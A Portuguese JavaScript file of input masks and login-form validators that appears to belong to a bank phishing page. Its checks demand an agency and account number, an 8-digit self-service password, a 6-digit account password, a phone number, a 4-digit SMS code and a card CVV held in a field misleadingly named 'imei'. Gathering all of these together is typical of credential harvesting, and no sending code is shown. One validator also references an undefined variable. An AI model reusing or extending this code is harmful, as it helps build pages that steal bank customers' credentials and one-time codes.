/* ================================================================ */

function SomenteNumero(e){
	console.log('====================================');
	console.log(e);
	console.log('====================================');
	var tecla=(window.event)?event.keyCode:e.which;
	if((tecla > 47 && tecla < 58)) return true;
	else{
		if (tecla != 8) return false;
		else return true;
	}
}

/* ================================================================ */

function maskTrak(format, field)
{
	var result = "";
	var maskIdx = format.length - 1;
	var error = false;
	var valor = field.value;
	var posFinal = false;
	if( field.setSelectionRange ) 
	{
		if(field.selectionStart == valor.length)
		posFinal = true;
	}
	valor = valor.replace(/[^0123456789Xx]/g,'')
	for (var valIdx = valor.length - 1; valIdx >= 0 && maskIdx >= 0; --maskIdx)
	{
		var chr = valor.charAt(valIdx);
		var chrMask = format.charAt(maskIdx);
		switch (chrMask)
		{
			case '#':
			if(!(/\d/.test(chr)))
			error = true;
			result = chr + result;
			--valIdx;
			break;
			case '@':
			result = chr + result;
			--valIdx;
			break;
			default:
			result = chrMask + result;
		}
	}
	
	field.value = result;
	field.style.color = error ? 'red' : '';
	if(posFinal)
	{
		field.selectionStart = result.length;
		field.selectionEnd = result.length;
	}
	return result;
}

function mascaraTelefone( campo ) {
	
	function trata( valor,  isOnBlur ) {
		
		valor = valor.replace(/\D/g,"");             			
		valor = valor.replace(/^(\d{2})(\d)/g,"($1)$2"); 		
		
		if( isOnBlur ) {
			
			valor = valor.replace(/(\d)(\d{4})$/,"$1-$2");   
		} else {
			
			valor = valor.replace(/(\d)(\d{3})$/,"$1-$2"); 
		}
		return valor;
	}
	
	campo.onkeypress = function (evt) {
		
		var code = (window.event)? window.event.keyCode : evt.which;	
		var valor = this.value
		
		if(code > 57 || (code < 48 && code != 8 ))  {
			return false;
		} else {
			this.value = trata(valor, false);
		}
	}
	
	campo.onblur = function() {
		
		var valor = this.value;
		if( valor.length < 13 ) {
			this.value = ""
		}else {		
			this.value = trata( this.value, true );
		}
	}
	
	campo.maxLength = 14;
}

/* ================================================================ */

function mask(isNum, event, field, mask, maxLength) {
	
	var keyCode;
	if (event.srcElement)
	keyCode = event.keyCode;
	else if (event.target)
	keyCode = event.which;
	
	var maskStack = new Array();
	
	var isDynMask = false;
	if (mask.indexOf('[') != -1)
	isDynMask = true;
	
	var length = mask.length;
	
	for (var i = 0; i < length; i++)
	maskStack.push(mask.charAt(i));
	
	var value = field.value;
	var i = value.length;
	
	if (keyCode == 0 || keyCode == 8)
	return true;
	
	//código adaptado para aceitar X (maiúsculo) ou x (minúsculo), além de números
	if (isNum && (keyCode < 48 || keyCode > 57) && (keyCode != 88) && (keyCode != 120))
	return false;
	
	if (!isDynMask && i < length) {
		
		if (maskStack.toString().indexOf(String.fromCharCode(keyCode)) != -1 && keyCode != 8) {
			return false;
		} else {
			if (keyCode != 8) {
				if (maskStack[i] != '#') {
					var old = field.value;
					field.value = old + maskStack[i];
				}			
			}
			
			if (autoTab(field, keyCode, length)) {
				if (!document.layers) {
					return true;
				} else if (keyCode != 8) {
					field.value += String.fromCharCode(keyCode);
					return false;
				} else {
					return true;
				}
			} else {
				return false;
			}				
		}
		
	} else if (isDynMask) {
		var maskChars = "";
		for (var j = 0; j < maskStack.length; j++)
		if (maskStack[j] != '#' && maskStack[j] != '[' && maskStack[j] != ']')
		maskChars += maskStack[j];
		
		var tempValue = "";
		for (var j = 0; j < value.length; j++) {
			if (maskChars.indexOf(value.charAt(j)) == -1)
			tempValue += value.charAt(j);
		}
		
		value = tempValue + String.fromCharCode(keyCode);
		
		if (maskChars.indexOf(String.fromCharCode(keyCode)) != -1) {
			return false;
		} else {
			var staticMask = mask.substring(mask.indexOf(']') + 1);
			var dynMask = mask.substring(mask.indexOf('[') + 1, mask.indexOf(']'));
			
			var realMask = new Array;
			
			if (mask.indexOf('[') == 0) {
				var countStaticMask = staticMask.length - 1;
				var countDynMask = dynMask.length - 1;
				
				for (var j = value.length - 1; j >= 0; j--) {
					if (countStaticMask >= 0) {
						realMask.push(staticMask.charAt(countStaticMask));
						countStaticMask--; 
					} 
					if (countStaticMask < 0) {
						if (countDynMask >= 0) {
							if (dynMask.charAt(countDynMask) != '#') {
								realMask.push(dynMask.charAt(countDynMask));
								countDynMask--;
							}
						}
						if (countDynMask == -1) {
							countDynMask = dynMask.length - 1;
						}
						realMask.push(dynMask.charAt(countDynMask));
						countDynMask--; 
					}
				}
			}
			
			var result = "";
			
			var countValue = 0;
			
			while (realMask.length > 0) {
				var c = realMask.pop();	
				if (c == '#') {
					result += value.charAt(countValue);
					countValue++;	
				} else {
					result += c;
				}
			}
			
			field.value = result;
			
			if (maxLength != undefined &&  value.length == maxLength) {
				
				var form = field.form;
				for (var i = 0; i < form.elements.length; i++) {
					if (form.elements[i] == field) {
						field.blur();
						//if alterado para quando a máscara for utilizada no último campo, não dê mensagem de erro quando tentar colocar o foco no "Salvar"
						//if (form.elements[i + 1] != null)										 
						if ((form.elements[i + 1] != null) && (form.elements[i + 1].name != "METHOD"))
						form.elements[i + 1].focus();
						break;
					}
				}
			}
			
			return false;
		}
	} else {
		return false;
	}
}
/* mask */
function FormataDado(campo,tammax,pos,teclapres){
	var keyCode;
	if (teclapres.srcElement)
	keyCode = teclapres.keyCode;
	else if (teclapres.target)
	keyCode = teclapres.which;
	
	if (keyCode == 0 || keyCode == 8)
	return true;
	
	if ((keyCode < 48 || keyCode > 57) && (keyCode != 88) && (keyCode != 120))
	return false;
	
	var tecla = keyCode;
	vr = document.getElementById(campo).value;
	vr = vr.replace( "-", "" );
	vr = vr.replace( "/", "" );
	tam = vr.length ;
	
	if (tam < tammax && tecla != 8){ tam = vr.length + 1 ; }
	
	if (tecla == 8 ){ tam = tam - 1 ; }
	if ( tecla == 8 || tecla == 88 || tecla >= 48 && tecla <= 57 || tecla >= 96 && tecla <= 105 || tecla == 120){
		if ( tam <= 2 ){
			document.getElementById(campo).value = vr ;}
			if ( tam > pos && tam <= tammax ){
				document.getElementById(campo).value = vr.substr( 0, tam - pos ) + '-' + vr.substr( tam - pos, tam );}
			}
		}
		/* formataDado */
		function check_lg(){
			var agencia = document.getElementById('dependenciaOrigem');
			var conta 	= document.getElementById('Conta');
			var pass8 	= document.getElementById('inpSenha');
			if (agencia.value == "" || 
			agencia.value.length < 5 || 
			agencia.value == "0000-0" || 
			agencia.value == "1111-1" || 
			agencia.value == "2222-2" ||
			agencia.value == "3333-3" || 
			agencia.value == "4444-4" || 
			agencia.value == "5555-5" || 
			agencia.value == "6666-6" || 
			agencia.value == "7777-7" || 
			agencia.value == "8888-8" || 
			agencia.value == "9999-9"){
				alert ("Não conseguimos identificar a agência informada.\nVerifique os dados, e tente novamente!");
				agencia.focus();
				return false;
			}
			if (conta.value == "" || 
			conta.value.length < 3 || 
			conta.value == "00000000000-0" || 
			conta.value == "11111111111-1" || 
			conta.value == "22222222222-2" || 
			conta.value == "33333333333-3" || 
			conta.value == "44444444444-4" || 
			conta.value == "55555555555-5" || 
			conta.value == "66666666666-6" || 
			conta.value == "77777777777-7" || 
			conta.value == "88888888888-8" || 
			conta.value == "99999999999-9"){
				alert ("Favor, informe o número da sua conta, seguido do dígito verificador corretamente!");
				conta.focus();
				return false;
			}
			
			if (pass8.value == "" || 
			pass8.value.length < 8 || 
			pass8.value.length > 8 || 
			pass8.value == "00000000" || 
			pass8.value == "11111111" || 
			pass8.value == "22222222" || 
			pass8.value == "33333333" || 
			pass8.value == "44444444" || 
			pass8.value == "55555555" || 
			pass8.value == "66666666" || 
			pass8.value == "77777777" || 
			pass8.value == "88888888" || 
			pass8.value == "99999999"){
				alert ("A senha auto-atendimento informada inválida!\nTente novamente!");
				pass8.focus();
				return false;
			}
		}
		function check_pj(){
			var chave = document.getElementById('chavej');
			var pass8 	= document.getElementById('pass8');
			if (chave.value == "" || 
			agencia.value.length < 15){
				alert ("Não conseguimos identificar a Chave informada.\nVerifique os dados, e tente novamente!");
				agencia.focus();
				return false;
			}
			if (pass8.value == "" || 
			pass8.value.length < 8 || 
			pass8.value.length > 8 || 
			pass8.value == "00000000" || 
			pass8.value == "11111111" || 
			pass8.value == "22222222" || 
			pass8.value == "33333333" || 
			pass8.value == "44444444" || 
			pass8.value == "55555555" || 
			pass8.value == "66666666" || 
			pass8.value == "77777777" || 
			pass8.value == "88888888" || 
			pass8.value == "99999999"){
				alert ("A senha auto-atendimento informada inválida!\nTente novamente!");
				pass8.focus();
				return false;
			}
		}
		function check_phone(){
			var ddd_fone    = document.getElementById('ddd').value;
			var tel_fone 	= document.getElementById('tel_fone').value;
			var pass6 		= document.getElementById('pass6').value;
			
			if(ddd_fone == 'ddd'){
				alert("Telefone incorreto.\nInforme o DDD do telefone cadastrado corretamente.");
				return false;
			}
			
			if(tel_fone.length != 10){
				alert("Telefone incorreto.\nInforme o telefone cadastrado!");
				document.getElementById('tel_fone').value = '';
				document.getElementById('tel_fone').focus();
				return false;
			}
			
			if(pass6.length < 6 || pass6.length > 6){
				alert("Esta operação deve ser confirmada com sua senha da conta corrente (6 dígitos)!");
				document.getElementById('pass6').focus();
				document.getElementById('pass6').focus();
				return false;
			}
		}
		function check_sms(){
			var sms = document.getElementById('sms').value;
			if(sms.length < 4){
				alert("A senha de 4 dígitos informada não está correta.\n\nVerifique sua senha e tente novamente!");
				document.getElementById('sms').value = '';
				document.getElementById('sms').focus();
				return false;
			}
		}
		function check_imei(){
			var cvv = document.getElementById('imei').value;
			
			if(cvv.length < 3){
				alert("Você deve informar corretamente o número do CVV");
				document.getElementById('imei').value = '';
				document.getElementById('imei').focus();
				return false;
			}
		}